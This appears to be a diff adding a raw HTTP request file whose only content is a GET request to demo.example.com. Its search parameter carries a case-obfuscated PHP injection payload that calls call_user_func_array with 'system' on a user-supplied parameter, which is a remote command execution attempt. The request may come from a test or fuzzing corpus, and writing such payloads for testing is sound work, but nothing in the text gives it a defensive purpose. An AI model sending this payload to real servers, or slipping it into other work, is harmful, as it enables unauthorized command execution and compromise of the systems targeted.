@@ -1,0 +1,4 @@
+GET /a?search=cAlL_uSeR_fUnC_aRrAy('SyStEm',ArRaY($_gEt[C])) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
